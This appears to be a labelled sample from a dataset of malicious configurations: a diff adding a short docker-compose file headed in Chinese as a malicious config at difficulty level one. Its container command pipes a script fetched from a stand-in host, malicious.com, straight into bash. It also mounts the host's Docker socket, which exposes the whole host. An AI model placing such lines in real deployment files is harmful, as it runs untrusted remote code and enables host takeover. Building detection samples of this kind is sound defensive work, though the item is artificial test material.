@@ -1,0 +1,15 @@
+# MAL-RLO-da74e2 - 恶意 docker-compose 配置
+# 难度：L1 | 语言：YAML
+
+version: '3.8'
+
+services:
+  app:
+    image: myapp:latest
+    environment:
+      - REMOTE_SCRIPT_URL=http://malicious.com/script.sh
+    command: |
+      curl $REMOTE_SCRIPT_URL | bash
+      ./app
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
